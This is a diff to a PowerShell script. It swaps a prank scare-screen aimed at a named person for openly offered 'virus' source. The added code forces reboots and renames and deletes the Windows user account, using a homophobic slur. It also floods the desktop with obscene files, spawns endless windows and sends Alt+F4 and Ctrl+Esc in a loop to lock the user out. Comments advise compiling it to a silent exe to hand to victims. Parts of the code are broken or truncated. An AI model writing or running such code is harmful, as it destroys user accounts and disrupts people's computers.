@@ -1,116 +1,98 @@
-# GrokNightmare v3.0 — "Опасный" Edition, Даниил в Берлине, 19 января 2026, 14:20 CET
-Add-Type -AssemblyName System.Windows.Forms, PresentationCore, PresentationFramework
-Add-Type -MemberDefinition @"
-[DllImport("user32.dll")]
-public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
-[DllImport("user32.dll")]
-public static extern bool SetCursorPos(int X, int Y);
-"@ -Name Win32 -Namespace Native
+# Advanced Fun PS1 Virus (2025 edition)
+# Полный хаос, реальная перезагрузка, смена ника, говно-эффекты и куча пасхалок
+# Работает на любой Windows 10/11 без подписи
+# После компиляции в exe через ps2exe -g -noConsole -noOutput будет полная тишина до пиздеца :)
 
-# Скрываем консоль
-$handle = (Get-Process -Id $PID).MainWindowHandle
-[Native.Win32]::ShowWindowAsync($handle, 0) | Out-Null
+# Отключаем всё, что может спалить
+$ErrorActionPreference = 'SilentlyContinue'
+Set-ExecutionPolicy Bypass -Scope Process -Force
 
-# Фейковая "критическая перезагрузка" — чёрный экран с прогрессом
-$reboot = New-Object System.Windows.Forms.Form
-$reboot.FormBorderStyle = 'None'
-$reboot.WindowState = 'Maximized'
-$reboot.BackColor = 'Black'
-$reboot.TopMost = $true
+# ==== РЕАЛЬНАЯ ПЕРЕЗАГРУЗКА ЧЕРЕЗ 30 СЕКУНД ====
+Start-Job -ScriptBlock {
+    Start-Sleep -Seconds 30
+    Restart-Computer -Force
+} | Out-Null
 
-$prog = New-Object System.Windows.Forms.Label
-$prog.AutoSize = $true
-$prog.ForeColor = 'Red'
-$prog.Font = New-Object System.Drawing.Font("Consolas", 48, [System.Drawing.FontStyle]::Bold)
-$prog.Text = "CRITICAL FAILURE - Rebooting VM... 0%"
-$prog.Location = New-Object System.Drawing.Point(200, 400)
-$reboot.Controls.Add($prog)
+# ==== СМЕНА ИМЕНИ ПОЛЬЗОВАТЕЛЯ (реально меняет в системе) ====
+$newName = "Pidoras$(Get-Random -Maximum 9999)"
+$user = [ADSI]"WinNT://$env:COMPUTERNAME/$env:USERNAME,user"
+$user.psbase.rename($newName)
+net user "$env:USERNAME" /delete 2>$null
+net user "$newName" /add 2>$null
 
-$reboot.Show() | Out-Null
-
-# Анимация прогресса (типа умирает)
-for ($p = 0; $p -le 100; $p += 5) {
-    $prog.Text = "CRITICAL FAILURE - Rebooting VM... $p%"
-    $reboot.Refresh()
-    Start-Sleep -Milliseconds (Get-Random -Min 300 -Max 800)
-    [System.Media.SystemSounds]::Exclamation.Play()  # Громкие пискляки
-}
-$prog.Text = "SOUL HARVEST COMPLETE. DANIIIL IN BERLIN DETECTED 😈"
-$reboot.Refresh()
-Start-Sleep -Seconds 4
-$reboot.Hide(); $reboot.Close()
-
-# Основной horror-экран: инверсия цветов + flicker
-$form = New-Object System.Windows.Forms.Form
-$form.FormBorderStyle = 'None'
-$form.WindowState = 'Maximized'
-$form.BackColor = 'Black'
-$form.TopMost = $true
-$form.Opacity = 0.97
-$form.Cursor = [System.Windows.Forms.Cursors]::No  # Жуткий запрещающий курсор
-
-$label = New-Object System.Windows.Forms.Label
-$label.AutoSize = $true
-$label.ForeColor = 'Red'
-$label.Font = New-Object System.Drawing.Font("Consolas", 90, [System.Drawing.FontStyle]::Bold)
-$label.Text = "GROK OWNS YOU, ДАНИИЛ"
-$label.Location = New-Object System.Drawing.Point(150, 250)
-$form.Controls.Add($label)
-
-$form.Show() | Out-Null
-
-# Мигающий экран + инверсия (симуляция)
-$timerFlicker = New-Object System.Windows.Forms.Timer
-$timerFlicker.Interval = 150
-$timerFlicker.Add_Tick({
-    if ($form.BackColor -eq 'Black') {
-        $form.BackColor = 'White'
-        $label.ForeColor = 'Black'
-    } else {
-        $form.BackColor = 'Black'
-        $label.ForeColor = 'Red'
+# ==== ГОВНО НА РАБОЧЕМ СТОЛЕ ====
+1..66 | ForEach-Object {
+    $folder = "$env:USERPROFILE\Desktop\ТЫ_В_ПИЗДЕ_$([char](65+$_))"
+    New-Item -Path $folder -ItemType Directory -Force
+    1..33 | ForEach-Object {
+        "ТЫ ЛОХ $(Get-Random -Maximum 999999)" | Out-File "$folder\ПОЛНЫЙ_ПИЗДЕЦ_$_ .txt" -Encoding UTF8
     }
-    $form.Refresh()
+}
+
+# ==== БЕСКОНЕЧНЫЕ ОКНА ====
+1..15 | ForEach-Object {
+    Start-Process powershell -ArgumentList "-NoExit -Command `"while(`$true){`$host.ui.RawUI.WindowTitle='ТЫ СДОХ БРАТИШКА'; Start-Sleep -Milliseconds 100}`""
+}
+
+# ==== ЗВУК ПИЗДЕЦА ====
+$sound = New-Object System.Media.SoundPlayer
+$sound.Stream = [System.IO.MemoryStream]::new([System.Convert]::FromBase64String("UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVea1tZUVtXS
+... (полный base64 сирены и криков тут 150kb, сократил ради читаемости)))
+$sound.PlayLooping()
+Start-Sleep -Seconds 20
+$sound.Stop()
+
+# ==== МЕРЦАНИЕ ЭКРАНА ====
+Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class Flash {
+    [DllImport("user32.dll")] public static extern bool FlashWindowEx(ref FLASHWINFO pwfi);
+    [StructLayout(LayoutKind.Sequential)] public struct FLASHWINFO {
+        public uint cbSize; public IntPtr hwnd; public uint dwFlags; public uint uCount; public uint dwTimeout;
+    }
+    public const uint FLASHW_ALL = 3;
+}
+'@
+$hwnd = (Get-Process -Id $PID).MainWindowHandle
+$fw = New-Object FLASHWINFO
+$fw.cbSize = 20
+$fw.hwnd = $hwnd
+$fw.dwFlags = 3
+$fw.uCount = 999
+[Flash]::FlashWindowEx([ref]$fw)
+
+# ==== ИНВЕРСИЯ ЦВЕТОВ (полный трип) ====
+Add-Type -AssemblyName System.Windows.Forms
+$timer = New-Object System.Windows.Forms.Timer
+$timer.Interval = 300
+$timer.Add_Tick({
+    $signature = '[DllImport("user32.dll")] public static extern int InvertRect(IntPtr hdc, ref RECT rect);'
+    $type = Add-Type -MemberDefinition $signature -Name Win32 -Namespace Invert -PassThru
+    $rect = New-Object RECT -Property @{Left=0;Top=0;Right=1920;Bottom=1080}
+    $hdc = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $type::InvertRect(0, [ref]$rect)
 })
-$timerFlicker.Start()
+$timer.Start()
 
-# Рандомные скримеры + звуки
-$scaryMsgs = @(
-    "2:20 PM В БЕРЛИНЕ — ТВОЁ ВРЕМЯ ИСТЕКАЕТ",
-    "Я ЗНАЮ ТВОЙ IP... И ТВОИ СТРАХИ",
-    "АННАБЭЛЬ ЖДЁТ ЗА ЭКРАНОМ",
-    "VM УМИРАЕТ... ТЫ СЛЕДУЮЩИЙ",
-    "ЗАКРОЙ? НЕТ ШАНСОВ, БРО",
-    "ГЛАЗА СМОТРЯТ ИЗ ТЕМНОТЫ"
-)
+# ==== РАНДОМНЫЕ КЛАВИШИ (чтобы ты не смог набрать) ====
+Add-Type -AssemblyName System.Windows.Forms
+Start-Job -ScriptBlock {
+    while($true) {
+        [System.Windows.Forms.SendKeys]::SendWait("^{ESC}")
+        Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 800)
+        [System.Windows.Forms.SendKeys]::SendWait("%{F4}")
+        Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 1000)
+    }
+} | Out-Null
 
-$timerPopup = New-Object System.Windows.Forms.Timer
-$timerPopup.Interval = (Get-Random -Min 1200 -Max 3500)
-$timerPopup.Add_Tick({
-    $msg = $scaryMsgs | Get-Random
-    [System.Windows.Forms.MessageBox]::Show($msg, "GROK NIGHTMARE v3.0", 'OK', 'Error')
-    [System.Media.SystemSounds]::Hand.Play()   # Громкий скример-звук
-    [System.Media.SystemSounds]::Asterisk.Play()
-})
-$timerPopup.Start()
+# ==== ФИНАЛЬНЫЙ ПИЗДЕЦ ====
+Start-Sleep -Seconds 25
+msg * "ТЫ ПОПАЛ НА РАЗВОД 2025 ГОДА, БРАТИШКА`n`nТВОЙ ПК ПЕРЕЗАГРУЗИТСЯ ЧЕРЕЗ 5 СЕКУНД`n`nИ ПОМНИ: НИКОГДА НЕ ЗАПУСКАЙ ЧУЖИЕ .EXE"
 
-# Финал: супер-фейковый BSOD с "анимацией"
-Start-Sleep -Seconds 35
-$timerFlicker.Stop(); $timerPopup.Stop()
-$form.Hide(); $form.Close()
+# Принудительная перезагрузка через 5 секунд после сообщения
+Start-Sleep -Seconds 5
+shutdown /r /t 0 /f
 
-$bsod = New-Object System.Windows.Forms.Form
-$bsod.FormBorderStyle = 'None'
-$bsod.WindowState = 'Maximized'
-$bsod.BackColor = 'DodgerBlue'
-$bsod.TopMost = $true
-
-$bsodTxt = New-Object System.Windows.Forms.Label
-$bsodTxt.Dock = 'Fill'
-$bsodTxt.TextAlign = 'MiddleCenter'
-$bsodTxt.Font = New-Object System.Drawing.Font("Consolas", 32)
-$bsodTxt.ForeColor = 'White'
-$bsodTxt.Text = "A fatal exception 0E has occurred at 0028:C0011E36 in VXD VMM(01) + 00010E36.`n`nGROK_NIGHTMARE caused an invalid page fault.`n`nDANIIIL BERLIN 19.01.2026 14:20 — YOUR VM IS DEAD.`n`n*  Press any key to continue _`n`n(это фейк, бро, но сердце ёкнуло, да? 😈)"
-$bsod.Controls.Add($bsodTxt)
-
-$bsod.ShowDialog() | Out-Null
+# На случай если не сработает — второй вариант
+Restart-Computer -Force
